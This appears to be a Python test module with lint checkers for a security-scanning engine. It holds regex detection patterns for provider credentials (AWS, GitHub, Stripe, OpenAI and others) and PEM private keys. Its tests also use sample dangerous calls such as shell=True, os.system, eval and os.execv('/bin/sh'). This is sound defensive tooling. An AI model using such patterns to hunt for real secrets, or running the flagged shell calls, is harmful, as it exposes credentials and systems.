    "typing.reveal_type": "typing.reveal_type is 3.11", "typing.TypeVarTuple": "typing.TypeVarTuple is 3.11", "typing.Unpack": "typing.Unpack is 3.11",
    "typing.Required": "typing.Required is 3.11", "typing.NotRequired": "typing.NotRequired is 3.11",
    "typing.dataclass_transform": "typing.dataclass_transform is 3.11", "typing.override": "typing.override is 3.12",
    "typing.TypeAliasType": "typing.TypeAliasType is 3.12", "typing.get_overloads": "typing.get_overloads is 3.11",
    "enum.StrEnum": "enum.StrEnum is 3.11", "enum.ReprEnum": "enum.ReprEnum is 3.11", "enum.verify": "enum.verify is 3.11",
    "enum.member": "enum.member is 3.11", "enum.nonmember": "enum.nonmember is 3.11", "enum.global_enum": "enum.global_enum is 3.11",
    "datetime.UTC": "datetime.UTC is 3.11 (use datetime.timezone.utc)", "asyncio.TaskGroup": "asyncio.TaskGroup is 3.11",
    "asyncio.timeout": "asyncio.timeout is 3.11", "asyncio.timeout_at": "asyncio.timeout_at is 3.11", "asyncio.Runner": "asyncio.Runner is 3.11",
    "asyncio.Barrier": "asyncio.Barrier is 3.11", "contextlib.chdir": "contextlib.chdir is 3.11", "hashlib.file_digest": "hashlib.file_digest is 3.11",
    "itertools.batched": "itertools.batched is 3.12", "math.cbrt": "math.cbrt is 3.11", "math.exp2": "math.exp2 is 3.11",
    "operator.call": "operator.call is 3.11", "sys.exception": "sys.exception is 3.11", "ExceptionGroup": "ExceptionGroup is 3.11",
    "BaseExceptionGroup": "BaseExceptionGroup is 3.11", "logging.getLevelNamesMapping": "logging.getLevelNamesMapping is 3.11",
}


def _fstring_problems(rel: str, text: str) -> "list[str]":
    """PEP 701 (3.12): inside the braces of an f-string, a quote like the one that opened it, a backslash, a comment. ``ast.parse`` accepts
    them whatever ``feature_version`` says, so they are read from the token stream (3.12 and later; older parsers reject them anyway)."""
    problems: "list[str]" = []
    stack: "list[list[object]]" = []                    # [quote, brace depth] per open f-string
    try:
        tokens = list(tokenize.generate_tokens(io.StringIO(text).readline))
    except (tokenize.TokenError, SyntaxError, IndentationError):
        return problems
    start_type = getattr(tokenize, "FSTRING_START", None)
    end_type = getattr(tokenize, "FSTRING_END", None)
    if start_type is None or end_type is None:
        return problems
    for token in tokens:
        in_field = bool(stack) and int(stack[-1][1]) > 0  # type: ignore[call-overload]
        if token.type == start_type:
            quote = token.string.lstrip("rRfFbBuU")
            if in_field and quote[:1] == str(stack[-1][0])[:1]:
                problems.append(_problem(rel, token.start[0], "an f-string reuses the quote of the one around it (3.12 only)"))
            stack.append([quote, 0])
        elif token.type == end_type:
            if stack:
                stack.pop()
        elif stack:
            if token.type == tokenize.OP and token.string == "{":
                stack[-1][1] = int(stack[-1][1]) + 1  # type: ignore[call-overload]
            elif token.type == tokenize.OP and token.string == "}" and in_field:
                stack[-1][1] = int(stack[-1][1]) - 1  # type: ignore[call-overload]
            elif in_field and token.type == tokenize.STRING:
                if token.string.lstrip("rRbBuUfF")[:1] == str(stack[-1][0])[:1]:
                    problems.append(_problem(rel, token.start[0], "an f-string reuses the quote of the one around it (3.12 only)"))
                if "\\" in token.string:
                    problems.append(_problem(rel, token.start[0], "a backslash inside the braces of an f-string (3.12 only)"))
            elif in_field and token.type == tokenize.COMMENT:
                problems.append(_problem(rel, token.start[0], "a comment inside the braces of an f-string (3.12 only)"))
    return problems


def lint_floor(sources: "Mapping[str, str]") -> "list[str]":
    """Python 3.10 is the floor: parses as 3.10, no 3.11+ name or form, no 3.12 f-string form."""
    problems: "list[str]" = []
    for rel in sorted(sources):
        text = sources[rel]
        try:
            tree = ast.parse(text, filename=rel, feature_version=FLOOR)
        except SyntaxError as exc:
            problems.append(_problem(rel, exc.lineno or 0, "does not parse as Python %d.%d: %s" % (FLOOR + (exc.msg,))))
            continue
        except (ValueError, RecursionError) as exc:
            problems.append(_problem(rel, 0, "does not parse as Python %d.%d: %s" % (FLOOR + (type(exc).__name__,))))
            continue
        bound = _bindings(rel, tree)
        seen: "set[tuple[int, str]]" = set()

        def report(node: "ast.AST | int", text_: str) -> None:
            line = node if isinstance(node, int) else getattr(node, "lineno", 0)
            if (line, text_) not in seen:
                seen.add((line, text_))
                problems.append(_problem(rel, line, "%s; Python 3.10 is the floor" % text_))

        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                for alias in node.names:
                    if alias.name == "tomllib" or alias.name.startswith("tomllib."):
                        report(node, _NEWER_THAN_THE_FLOOR["tomllib"])
            elif isinstance(node, ast.ImportFrom):
                base = _from_base(rel, node) or ""
                if base == "tomllib" or base.startswith("tomllib."):
                    report(node, _NEWER_THAN_THE_FLOOR["tomllib"])
                for alias in node.names:
                    qualified = base + "." + alias.name if base else alias.name
                    if qualified in _NEWER_THAN_THE_FLOOR:
                        report(node, _NEWER_THAN_THE_FLOOR[qualified])
            if isinstance(node, (ast.Attribute, ast.Name)):
                qualified = _qualify(node, bound)
                if qualified in _NEWER_THAN_THE_FLOOR:
                    report(node, _NEWER_THAN_THE_FLOOR[qualified])
            if isinstance(node, ast.Call):
                name = _qualify(node.func, bound)
                if name in ("isinstance", "issubclass") and len(node.args) > 1 and isinstance(node.args[1], ast.BinOp) \
                        and isinstance(node.args[1].op, ast.BitOr):
                    report(node, "a | union as the second argument of %s (use a tuple)" % name)
                if name == "shutil.rmtree" and any(k.arg == "onexc" for k in node.keywords):
                    report(node, "shutil.rmtree(onexc=) is 3.12 (use onerror)")
            if isinstance(node, ast.Subscript):
                subscript = node.slice
                if isinstance(subscript, ast.Starred) or (isinstance(subscript, ast.Tuple) and any(isinstance(e, ast.Starred) for e in subscript.elts)):
                    report(node, "a star expression in a subscript is 3.11")
        if sys.version_info >= (3, 12):
            problems.extend(_fstring_problems(rel, text))
    return problems


_PROVIDER_PATTERNS = (
    ("aws_access_key_id", r"(?:AKIA|ASIA|AGPA|AIDA|AROA|ANPA|ANVA)[0-9A-Z]{16}"),
    ("aws_secret_access_key", r"[Aa][Ww][Ss]_[Ss][Ee][Cc][Rr][Ee][Tt]_[Aa][Cc][Cc][Ee][Ss][Ss]_[Kk][Ee][Yy]\s*[\"']?\s*[=:]\s*[\"']?[A-Za-z0-9/+=]{40}"),
    ("github_token", r"gh[pousr]_[A-Za-z0-9]{36,255}"),
    ("github_fine_grained_pat", r"github_pat_[A-Za-z0-9_]{50,}"),
    ("gitlab_pat", r"glpat-[A-Za-z0-9_-]{20,}"),
    ("stripe_live_key", r"[sr]k_live_[A-Za-z0-9]{24,}"),
    ("slack_token", r"xox[bpars]-[0-9]{8,14}-[0-9]{8,14}(?:-[0-9]{8,14})?-[A-Za-z0-9]{20,}"),
    ("google_api_key", r"AIza[0-9A-Za-z_-]{35}"),
    ("google_oauth_token", r"ya29\.[0-9A-Za-z_-]{30,}"),
    ("sendgrid_key", r"SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}"),
    ("npm_token", r"npm_[A-Za-z0-9]{36}"),
    ("pypi_token", r"pypi-AgEIcHlwaS5vcmc[A-Za-z0-9_-]{50,}"),
    ("huggingface_token", r"hf_[A-Za-z0-9]{34,}"),
    ("anthropic_key", r"sk-ant-(?:api|admin)[0-9]{2}-[A-Za-z0-9_-]{60,}"),
    ("openai_project_key", r"sk-proj-[A-Za-z0-9_-]{40,}"),
    ("openai_legacy_key", r"sk-[A-Za-z0-9]{48}"),
    ("shopify_token", r"shp(?:at|ca|pa|ss)_[a-f0-9]{32}"),
    ("digitalocean_token", r"dop_v1_[a-f0-9]{64}"),
)
#: Layer 4 of the pipeline: a token is bounded by a character that is not a letter or digit on both sides, and a match that contains a
#: placeholder word (or a run of one character) is not a credential. The GitHub documentation token is split so this file never holds it.
_TOKEN_REGEXES = tuple((name, re.compile(r"(?<![A-Za-z0-9])(" + pattern + r")(?![A-Za-z0-9])")) for name, pattern in _PROVIDER_PATTERNS)
_PLACEHOLDER = re.compile(r"EXAMPLE|SAMPLE|DUMMY|PLACEHOLDER|YOUR|REDACTED|FAKE|CHANGEME|x{6,}|0{10,}|\*{3,}|\.{3}|1234567890|abcdefgh|([A-Za-z0-9])\1{9,}|"
                          + "ghp_16C7e42F" + "292c6912E7710c838347Ae178B4a", re.IGNORECASE)
_PEM_HEADER = re.compile(r"-----BEGIN [A-Z0-9 ]*PRIVATE KEY[A-Z0-9 ]*-----")
_PEM_WITH_BODY = re.compile(r"-----BEGIN [A-Z0-9 ]*PRIVATE KEY[A-Z0-9 ]*-----.{0,200}[A-Za-z0-9+/]{60,}")


def lint_tokens(sources: "Mapping[str, str]") -> "list[str]":
    """No contiguous provider-shaped credential (the 18 formats of Layer 4, placeholders excluded) and no PEM private key with a body."""
    problems: "list[str]" = []
    for rel in sorted(sources):
        text = sources[rel]
        for name, regex in _TOKEN_REGEXES:
            for match in regex.finditer(text):
                around = text[max(0, match.start() - 1):match.end() + 1]
                if not _PLACEHOLDER.search(around):
                    problems.append("%s:%d: a contiguous %s credential; build it from two halves at run time" % (rel, text.count("\n", 0, match.start()) + 1, name))
        for match in _PEM_HEADER.finditer(text):
            line_start = text.rfind("\n", 0, match.start()) + 1
            end = line_start
            for _ in range(6):                          # the header line and the five that follow it, as grep -A5 does
                newline = text.find("\n", end)
                if newline < 0:
                    end = len(text)
                    break
                end = newline + 1
            window = text[line_start:end].replace("\r", " ").replace("\n", " ").replace("\t", " ")
            if _PEM_WITH_BODY.search(window):
                problems.append("%s:%d: a PEM private key with a body; build it from two halves at run time" % (rel, text.count("\n", 0, match.start()) + 1))
    return problems


def lint_messages(rows: "Sequence[Sequence[str]]", script: str) -> "list[str]":
    """``rows`` are ``(rule set, rule id, outcome, message)``: every message occurs in ``scan_pipeline.sh`` (``script`` is its text)."""
    problems: "list[str]" = []
    for row in rows:
        ruleset, rule_id, _outcome, message = row[0], row[1], row[2], row[3]
        if not isinstance(message, str) or not message or message not in script:
            problems.append("rule table %s, rule %s: the message %r does not occur in scan_pipeline.sh; the bash string is the contract "
                            "(the allowlist, the classifier and the reports match on it)" % (ruleset, rule_id, message))
    return problems


def lint_patterns(rules: "Sequence[Sequence[object]]", known: "Sequence[str]") -> "list[str]":
    """``rules`` are ``(id, pattern, mode, excl)`` as ``rx.registered()`` lists them: every pattern and exclusion occurs in
    ``tests/conformance/patterns.json`` (``known`` holds every pattern text of it; ``occurs`` is substring containment)."""
    haystack = "\x00".join(known)
    problems: "list[str]" = []
    for row in rules:
        rule_id, pattern, _mode, excl = row[0], row[1], row[2], row[3]
        for label, text in (("pattern", pattern), ("exclusion", excl)):
            if text is not None and str(text) not in haystack:
                problems.append("rule %s: the %s %r does not occur in tests/conformance/patterns.json (it must be the text bash hands to grep; "
                                "regenerate the inventory only for a deliberate change of scan_pipeline.sh)" % (rule_id, label, text))
    return problems


def _dockerfile_copies(text: str) -> "list[tuple[list[str], str]]":
    """``(sources, destination)`` of every ``COPY`` that reads from the build context (not ``--from``), continuation lines joined."""
    copies: "list[tuple[list[str], str]]" = []
    for logical in re.sub(r"\\\r?\n", " ", text).splitlines():
        words = logical.split()
        if not words or words[0].startswith("#") or words[0].upper() != "COPY":
            continue
        flags = [w for w in words[1:] if w.startswith("--")]
        paths = [w for w in words[1:] if not w.startswith("--")]
        if len(paths) >= 2 and not any(flag.startswith("--from") for flag in flags):
            copies.append(([p.rstrip("/") for p in paths[:-1]], paths[-1]))
    return copies


def _shell_loops(text: str) -> "list[list[str]]":
    """The word lists of every ``for x in WORDS; do`` of a shell script (continuation lines joined, comment lines removed)."""
    code = "\n".join(line for line in re.sub(r"\\\r?\n", " ", text).splitlines() if not line.lstrip().startswith("#"))
    return [match.group(1).split() for match in re.finditer(r"\bfor\s+\w+\s+in\s+([^;\n]*);\s*do\b", code)]


def lint_packaging(texts: "Mapping[str, str]") -> "list[str]":
    """``scan_pipeline.py`` and ``transit/`` reach the Docker image, the offline bundle and the integrity manifest; CI runs the engine tests."""
    problems: "list[str]" = []
    for name in ("Dockerfile", "prepare_offline_install.sh", ".github/workflows/ci.yml", "selfcheck.py"):
        if name not in texts:
            problems.append("%s: missing" % name)
    if "Dockerfile" in texts:
        copies = _dockerfile_copies(texts["Dockerfile"])
        if not any("scan_pipeline.py" in paths for paths, _ in copies):
            problems.append("Dockerfile: no COPY instruction lists scan_pipeline.py; the Python engine would not be in the image")
        if not any("transit" in paths for paths, _ in copies):
            problems.append("Dockerfile: no COPY instruction copies the transit package; the Python engine would not be in the image")
    if "prepare_offline_install.sh" in texts:
        script = texts["prepare_offline_install.sh"]
        if not any("scan_pipeline.py" in words for words in _shell_loops(script)):
            problems.append("prepare_offline_install.sh: no file loop lists scan_pipeline.py; the offline bundle would not hold the Python engine")
        code = "\n".join(line for line in script.splitlines() if not line.lstrip().startswith("#"))
        if not re.search(r"\bcp\s+-[A-Za-z]*[rR][A-Za-z]*\s+transit\b", code):
            problems.append("prepare_offline_install.sh: nothing copies the transit package (cp -r transit ...); the offline bundle would not hold the engine")
    if ".github/workflows/ci.yml" in texts:
        code = "\n".join(line for line in texts[".github/workflows/ci.yml"].splitlines() if not line.lstrip().startswith("#"))
        if "unittest discover -s tests/engine" not in code:
            problems.append(".github/workflows/ci.yml: no step runs python3 -I -m unittest discover -s tests/engine")
        if not re.search(r"conformance\.py\s+check\b[^\n]*--engine\s+python\b", code):
            problems.append(".github/workflows/ci.yml: no step runs conformance.py check --engine python")
    if "selfcheck.py" in texts:
        text = texts["selfcheck.py"]
        if "transit/**/*.py" not in text:
            problems.append("selfcheck.py: the integrity manifest no longer globs transit/**/*.py; the engine package would not be covered")
        if '"*.py"' not in text and "'*.py'" not in text:
            problems.append('selfcheck.py: the integrity manifest no longer globs the top-level "*.py" files; scan_pipeline.py would not be covered')
    return problems
# CHECKERS>>

# ═══════════════════════════════════════════════════════════════════════════════════════════════
# test support
# ═══════════════════════════════════════════════════════════════════════════════════════════════
def src(text: str) -> str:
    """A sample source: de-indented, with a trailing newline."""
    lines = text.strip("\n").split("\n")
    indent = min((len(x) - len(x.lstrip()) for x in lines if x.strip()), default=0)
    return "\n".join(x[indent:] for x in lines) + "\n"


class LintCase(unittest.TestCase):
    """Assertions every lint test uses."""

    def assertFlags(self, problems: "list[str]", *needles: str) -> None:
        """At least one problem, and every needle occurs in some problem."""
        self.assertTrue(problems, "the lint reported nothing; it should have flagged this source")
        joined = "\n".join(problems)
        for needle in needles:
            self.assertIn(needle, joined)

    def assertCleanLint(self, problems: "list[str]") -> None:
        self.assertEqual([], problems, "the lint flagged:\n" + "\n".join(problems))


def engine_tree() -> "dict[str, str]":
    """The real engine sources, helper programs included."""
    return load_sources()


# ═══════════════════════════════════════════════════════════════════════════════════════════════
# 1. imports and layering (3.2 as amended)
# ═══════════════════════════════════════════════════════════════════════════════════════════════
class ImportCycleTests(LintCase):
    def test_real_tree_has_no_import_cycle(self):
        self.assertCleanLint(lint_import_cycles(engine_tree()))

    def test_flags_a_two_module_cycle(self):
        tree = tree_of(**{"transit/a.py": "from transit import b\n", "transit/b.py": "from transit.a import x\n"})
        self.assertFlags(lint_import_cycles(tree), "cycle", "transit.a", "transit.b")

    def test_flags_a_three_module_cycle(self):
        tree = tree_of(**{"transit/a.py": "import transit.b\n", "transit/b.py": "import transit.c\n", "transit/c.py": "import transit.a\n"})
        self.assertFlags(lint_import_cycles(tree), "cycle")

    def test_flags_a_cycle_closed_by_the_parent_package(self):
        """Importing ``transit.scanners.credentials`` runs ``transit/scanners/__init__.py`` first, so an ``__init__`` that imports its own
        submodule while the submodule imports the package is a cycle even though neither line says so twice."""
        tree = tree_of(**{"transit/scanners/__init__.py": "from transit.scanners import credentials\n",
                          "transit/scanners/credentials.py": "from transit.scanners import ScanContext\n"})
        self.assertFlags(lint_import_cycles(tree), "cycle")

    def test_flags_a_relative_import_cycle(self):
        tree = tree_of(**{"transit/a.py": "from . import b\n", "transit/b.py": "from .a import x\n"})
        self.assertFlags(lint_import_cycles(tree), "cycle")

    def test_flags_a_cycle_made_inside_a_function(self):
        """A function-level import is still an import: it only postpones the cycle to the first call."""
        tree = tree_of(**{"transit/a.py": "def f():\n    import transit.b\n", "transit/b.py": "import transit.a\n"})
        self.assertFlags(lint_import_cycles(tree), "cycle")

    def test_near_miss_a_diamond_is_not_a_cycle(self):
        tree = tree_of(**{"transit/leaf.py": "", "transit/left.py": "import transit.leaf\n", "transit/right.py": "from transit import leaf\n",
                          "transit/top.py": "import transit.left\nimport transit.right\n"})
        self.assertCleanLint(lint_import_cycles(tree))

    def test_near_miss_a_submodule_may_import_its_package(self):
        tree = tree_of(**{"transit/scanners/credentials.py": "from transit.scanners import ScanContext\n"})
        self.assertCleanLint(lint_import_cycles(tree))


class LayeringTests(LintCase):
    def test_real_tree_respects_the_layering(self):
        self.assertCleanLint(lint_layering(engine_tree()))

    # --- scanners and rules may not import verdict or console (except scanners/__init__) ------------------------------------
    def test_flags_a_scanner_that_imports_verdict(self):
        for line in ("from transit.verdict import Verdict", "import transit.verdict", "from transit import verdict",
                     "from .. import verdict as v", "from ..verdict import Verdict"):
            with self.subTest(line=line):
                tree = tree_of(**{"transit/verdict.py": "", "transit/scanners/shell.py": line + "\n"})
                self.assertFlags(lint_layering(tree), "transit/scanners/shell.py", "verdict")

    def test_flags_a_scanner_that_imports_console(self):
        for line in ("from transit.console import Console", "import transit.console as c", "from transit import console"):
            with self.subTest(line=line):
                tree = tree_of(**{"transit/console.py": "", "transit/scanners/doc.py": line + "\n"})
                self.assertFlags(lint_layering(tree), "transit/scanners/doc.py", "console")

    def test_flags_rules_that_import_verdict_or_console(self):
        for module in ("verdict", "console"):
            with self.subTest(module=module):
                tree = tree_of(**{"transit/%s.py" % module: "", "transit/rules/__init__.py": "from transit import %s\n" % module})
                self.assertFlags(lint_layering(tree), "transit/rules/__init__.py", module)

    def test_flags_a_function_level_import_of_verdict(self):
        tree = tree_of(**{"transit/verdict.py": "", "transit/scanners/shell.py": "def scan(ctx):\n    from transit.verdict import Verdict\n"})
        self.assertFlags(lint_layering(tree), "verdict")

    def test_near_miss_scanners_init_is_the_one_exemption(self):
        """Review log R-11: ``ScanContext`` names ``Verdict`` and ``Console`` in its constructor, so ``transit/scanners/__init__.py``
        (and only it) imports both. The lint must pass on that."""
        tree = tree_of(**{"transit/verdict.py": "", "transit/console.py": "",
                          "transit/scanners/__init__.py": "from transit.console import Console\nfrom transit.verdict import Verdict\n"})
        self.assertCleanLint(lint_layering(tree))

    def test_near_miss_the_exemption_does_not_cover_a_sibling(self):
        tree = tree_of(**{"transit/verdict.py": "", "transit/scanners/__init__.py": "from transit.verdict import Verdict\n",
                          "transit/scanners/universal.py": "from transit.verdict import Verdict\n"})
        problems = lint_layering(tree)
        self.assertFlags(problems, "transit/scanners/universal.py")
        self.assertEqual([], [p for p in problems if p.startswith("transit/scanners/__init__.py:")])

    # --- nobody under scanners/ or rules/ imports layers, pipeline or report -------------------------------------------------
    def test_flags_scanners_and_rules_that_import_layers_pipeline_or_report(self):
        for module in ("layers", "pipeline", "report"):
            for where in ("transit/scanners/__init__.py", "transit/scanners/shell.py", "transit/rules/__init__.py"):
                with self.subTest(module=module, where=where):
                    tree = tree_of(**{"transit/%s.py" % module: "", where: "from transit import %s\n" % module})
                    self.assertFlags(lint_layering(tree), where, module)

    # --- layers is imported by pipeline only, pipeline by scan_pipeline.py only --------------------------------------------
    def test_flags_an_importer_of_layers_that_is_not_pipeline(self):
        tree = tree_of(**{"transit/layers.py": "", "transit/report.py": "import transit.layers\n"})
        self.assertFlags(lint_layering(tree), "transit/report.py", "layers")

    def test_flags_an_importer_of_pipeline_that_is_not_the_entry_point(self):
        tree = tree_of(**{"transit/pipeline.py": "", "transit/layers.py": "from transit.pipeline import main\n"})
        self.assertFlags(lint_layering(tree), "transit/layers.py", "pipeline")

    def test_near_miss_pipeline_imports_layers_and_the_entry_point_imports_pipeline(self):
        tree = tree_of(**{"transit/layers.py": "", "transit/pipeline.py": "from transit.layers import run_all\n",
                          "scan_pipeline.py": "from transit.pipeline import main\n"})
        self.assertCleanLint(lint_layering(tree))

    # --- the leaves ---------------------------------------------------------------------------------------------------------
    def test_flags_a_leaf_that_imports_an_engine_module(self):
        for leaf in ("config", "console", "cli", "findings"):
            with self.subTest(leaf=leaf):
                tree = tree_of(**{"transit/rx.py": "", "transit/%s.py" % leaf: "from transit import rx\n"})
                self.assertFlags(lint_layering(tree), "transit/%s.py" % leaf, "leaf")

    def test_near_miss_a_leaf_may_import_the_standard_library(self):
        tree = tree_of(**{"transit/config.py": "import dataclasses\nfrom typing import Mapping\n"})
        self.assertCleanLint(lint_layering(tree))

    # --- the other frozen edges of the diagram ----------------------------------------------------------------------------
    def test_flags_dispatch_importing_a_scanner_or_the_registry(self):
        for line in ("import transit.scanners", "from transit.scanners import Registry", "from transit.scanners.shell import scan"):
            with self.subTest(line=line):
                tree = tree_of(**{"transit/scanners/shell.py": "", "transit/dispatch.py": line + "\n"})
                self.assertFlags(lint_layering(tree), "transit/dispatch.py")

    def test_flags_rules_that_import_anything_but_rx(self):
        tree = tree_of(**{"transit/files.py": "", "transit/rules/__init__.py": "from transit import files\n"})
        self.assertFlags(lint_layering(tree), "transit/rules/__init__.py", "files")

    def test_flags_verdict_importing_beyond_console_and_findings(self):
        tree = tree_of(**{"transit/files.py": "", "transit/verdict.py": "from transit.files import FileView\n"})
        self.assertFlags(lint_layering(tree), "transit/verdict.py", "files")

    def test_flags_the_registry_importing_a_scanner_module_statically(self):
        for line in ("from transit.scanners import credentials", "import transit.scanners.shell", "from .credentials import X",
                     "from transit import dispatch"):
            with self.subTest(line=line):
                tree = tree_of(**{"transit/dispatch.py": "", "transit/scanners/credentials.py": "", "transit/scanners/shell.py": "",
                                  "transit/scanners/__init__.py": line + "\n"})
                self.assertFlags(lint_layering(tree), "transit/scanners/__init__.py")

    def test_near_miss_the_registry_may_import_what_the_diagram_gives_it(self):
        text = src("""
            from transit import rules as _rules
            from transit import rx
            from transit.config import Config
            from transit.console import Console
            from transit.files import FileView
            from transit.rules import Matcher
            from transit.tools import ToolLocator
            from transit.verdict import Verdict
            import importlib
        """)
        tree = tree_of(**{n: "" for n in ("transit/rx.py", "transit/config.py", "transit/console.py", "transit/files.py",
                                          "transit/verdict.py")}, **{"transit/scanners/__init__.py": text})
        self.assertCleanLint(lint_layering(tree))

    def test_a_syntax_error_is_not_this_lints_business(self):
        self.assertCleanLint(lint_layering(tree_of(**{"transit/scanners/shell.py": "def (:\n"})))
        self.assertCleanLint(lint_import_cycles(tree_of(**{"transit/a.py": "def (:\n"})))


class RegexImportTests(LintCase):
    def test_real_tree_imports_re_only_in_rx(self):
        self.assertCleanLint(lint_regex_imports(engine_tree()))

    def test_flags_every_way_of_importing_re(self):
        for line in ("import re", "import re as _re", "from re import compile", "import os, re", "from re import *",
                     "__import__('re')", "import importlib\nimportlib.import_module('re')", "import re.foo"):
            with self.subTest(line=line):
                self.assertFlags(lint_regex_imports(tree_of(**{"transit/scanners/shell.py": line + "\n"})), "transit/scanners/shell.py")

    def test_flags_a_function_level_import_of_re(self):
        self.assertFlags(lint_regex_imports(tree_of(**{"transit/layers.py": "def f():\n    import re\n"})), "re")

    def test_flags_scan_pipeline_py_too(self):
        self.assertFlags(lint_regex_imports(tree_of(**{"scan_pipeline.py": "import re\n"})), "scan_pipeline.py")

    def test_near_miss_rx_and_the_helper_programs_may_import_re(self):
        tree = tree_of(**{"transit/rx.py": "import re\n", "transit/containers/jar.py": "import io, os, re, signal\n",
                          "transit/scanners/manifests.py": "import json, os, re, sys\n"})
        self.assertCleanLint(lint_regex_imports(tree))

    def test_near_miss_names_that_only_start_with_re(self):
        tree = tree_of(**{"transit/scanners/shell.py": "import readline\nimport reprlib\nfrom transit import rx\nfrom transit.rx import rule\n"})
        self.assertCleanLint(lint_regex_imports(tree))

    def test_flags_files_and_findings_importing_any_pattern_machinery(self):
        """Both read repository text (``.transitignore``, ``.diff_files``, ``.transit-allow.json``): a glob or an fnmatch is a regex."""
        for rel in ("transit/files.py", "transit/findings.py"):
            for line in ("import fnmatch", "from fnmatch import fnmatchcase", "import glob", "from glob import glob"):
                with self.subTest(rel=rel, line=line):
                    self.assertFlags(lint_regex_imports(tree_of(**{rel: line + "\n"})), rel)

    def test_near_miss_dispatch_may_use_fnmatch_on_engine_data(self):
        self.assertCleanLint(lint_regex_imports(tree_of(**{"transit/dispatch.py": "import fnmatch\n", "transit/rules/__init__.py": "import fnmatch\n"})))


class ConsoleOutputTests(LintCase):
    def test_real_tree_writes_to_the_console_only_in_console_and_the_entry_point(self):
        self.assertCleanLint(lint_console_output(engine_tree()))

    def test_flags_every_way_of_writing_to_the_console(self):
        samples = {
            "print": "print('x')\n",
            "print reference": "emit = print\n",
            "print with file": "import sys\nprint('x', file=sys.stderr)\n",
            "sys.stdout.write": "import sys\nsys.stdout.write('x')\n",
            "sys.stderr.write": "import sys\nsys.stderr.write('x')\n",
            "sys.stdout.buffer": "import sys\nout = sys.stdout.buffer\n",
            "dunder stdout": "import sys\nsys.__stdout__.write('x')\n",
            "from sys import stderr": "from sys import stderr\nstderr.write('x')\n",
            "import sys as s": "import sys as s\ns.stderr.write('x')\n",
            "traceback.print_exc": "import traceback\ntraceback.print_exc()\n",
            "traceback.print_exception": "from traceback import print_exception\nprint_exception(e)\n",
            "os.write 2": "import os\nos.write(2, b'x')\n",
            "os.write 1": "import os\nos.write(1, b'x')\n",
            "logging": "import logging\n",
            "from logging": "from logging import getLogger\n",
            "warnings.warn": "import warnings\nwarnings.warn('x')\n",
            "inside a function": "def f():\n    print('x')\n",
        }
        for name, text in samples.items():
            with self.subTest(name):
                self.assertFlags(lint_console_output(tree_of(**{"transit/layers.py": text})), "transit/layers.py")

    def test_flags_helper_free_modules_under_scanners_and_tools(self):
        for rel in ("transit/scanners/doc.py", "transit/tools/__init__.py", "transit/rules/__init__.py", "transit/report.py"):
            with self.subTest(rel=rel):
                self.assertFlags(lint_console_output(tree_of(**{rel: "print('x')\n"})), rel)

    def test_near_miss_console_and_the_entry_point_may_write(self):
        text = "import sys\nprint('x')\nsys.stderr.write('y')\nsys.stdout.flush()\n"
        self.assertCleanLint(lint_console_output(tree_of(**{"transit/console.py": text, "scan_pipeline.py": text})))

    def test_near_miss_the_helper_programs_print_their_facts(self):
        text = "import sys\nprint('FACT done')\nsys.stdout.flush()\n"
        tree = tree_of(**{"transit/containers/jar.py": text, "transit/tools/gitleaks.py": text, "transit/scanners/manifests.py": text})
        self.assertCleanLint(lint_console_output(tree))

    def test_near_miss_names_that_only_look_like_output(self):
        text = src('''
            """print('x') and sys.stderr.write('y') inside a docstring are text."""
            import sys
            # print('in a comment')
            MESSAGE = "print(x)"
            def f(report):
                report.print_summary()
                return repr(sys.argv), sys.exit
            class Printer:
                def print(self):
                    return 1
        ''')
        self.assertCleanLint(lint_console_output(tree_of(**{"transit/layers.py": text})))


class SubprocessTests(LintCase):
    def test_real_tree_confines_subprocess(self):
        self.assertCleanLint(lint_subprocess(engine_tree()))

    def test_flags_subprocess_outside_tools(self):
        for line in ("import subprocess", "import subprocess as sp", "from subprocess import run, PIPE", "import subprocess.x",
                     "__import__('subprocess')", "import importlib\nimportlib.import_module('subprocess')"):
            with self.subTest(line=line):
                self.assertFlags(lint_subprocess(tree_of(**{"transit/layers.py": line + "\n"})), "transit/layers.py", "subprocess")

    def test_flags_a_second_module_under_tools(self):
        self.assertFlags(lint_subprocess(tree_of(**{"transit/tools/semgrep_wrapper.py": "import subprocess\n"})), "semgrep_wrapper")

    def test_flags_the_other_ways_of_starting_a_process(self):
        for line in ("import os\nos.fork()", "import os\nos.execv('/bin/sh', ['sh'])", "import os\nos.execvp('sh', ['sh'])",
                     "import os\nos.spawnl(os.P_WAIT, 'x')", "import os\nos.posix_spawn('x', [], {})", "from os import fork\nfork()",
                     "import multiprocessing", "import pty", "import os\nos.forkpty()"):
            with self.subTest(line=line):
                self.assertFlags(lint_subprocess(tree_of(**{"transit/tools/__init__.py": line + "\n"})))

    def test_near_miss_tools_may_import_subprocess(self):
        self.assertCleanLint(lint_subprocess(tree_of(**{"transit/tools/__init__.py": "import subprocess\nsubprocess.Popen(['ls'])\nimport os\nos.killpg(1, 9)\n"})))

    def test_near_miss_the_helper_programs_are_not_the_engine(self):
        self.assertCleanLint(lint_subprocess(tree_of(**{"transit/containers/office.py": "import subprocess\n"})))

    def test_near_miss_a_word_in_a_string(self):
        self.assertCleanLint(lint_subprocess(tree_of(**{"transit/layers.py": 'RULE = r"(?i)(subprocess|os\\.system)"\n"""import subprocess"""\n'})))


class DangerousCallTests(LintCase):
    def test_real_tree_has_no_shell_eval_or_exec(self):
        self.assertCleanLint(lint_dangerous_calls(engine_tree()))

    def test_flags_each_dangerous_call(self):
        samples = {
            "shell=True": "import subprocess\nsubprocess.run(cmd, shell=True)\n",
            "shell=True in Popen": "from subprocess import Popen\nPopen(cmd, shell=True)\n",
            "shell=1": "run(cmd, shell=1)\n",
            "shell is a variable": "run(cmd, shell=flag)\n",
            "shell is a call": "run(cmd, shell=bool(x))\n",
            "os.system": "import os\nos.system('ls')\n",
            "os.popen": "import os\nos.popen('ls')\n",
            "from os import system": "from os import system\nsystem('ls')\n",
            "os as alias": "import os as o\no.system('ls')\n",
            "eval": "x = eval(text)\n",
            "exec": "exec(text)\n",
            "eval inside a function": "def f(t):\n    return eval(t)\n",
            "subprocess.getoutput": "import subprocess\nsubprocess.getoutput('ls')\n",
            "subprocess.getstatusoutput": "import subprocess\nsubprocess.getstatusoutput('ls')\n",
            "commands.getoutput": "import commands\ncommands.getoutput('ls')\n",
        }
        for name, text in samples.items():
            with self.subTest(name):
                self.assertFlags(lint_dangerous_calls(tree_of(**{"transit/tools/__init__.py": text})), "transit/tools/__init__.py")

